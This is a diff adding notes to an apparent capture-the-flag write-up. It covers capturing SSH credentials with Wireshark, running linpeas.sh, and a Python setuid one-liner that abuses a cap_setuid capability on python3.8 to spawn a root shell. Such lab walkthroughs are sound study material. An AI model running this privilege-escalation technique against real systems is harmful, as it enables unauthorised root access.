@@ -10,7 +10,8 @@ Tags:
 
 ## Intro
 
-1. 
+1. Use wireshark to capture packet
+2. linpeas.sh to escalate privilege
 
 ## Exploit
 
@@ -23,4 +24,23 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    gunicorn
 ```
 
-lag...
+### Use `WireShark`
+
+username: `nathan`
+password: `Buck3tH4TF0RM3`
+
+Connect ssh
+
+## Privilege Escalation
+
+Use `linpeas.sh`
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+Search [/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip](https://useful.adindrabkin.com/hacker-mode/linux-privilege-escalation-checklist)
+
+```
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+```
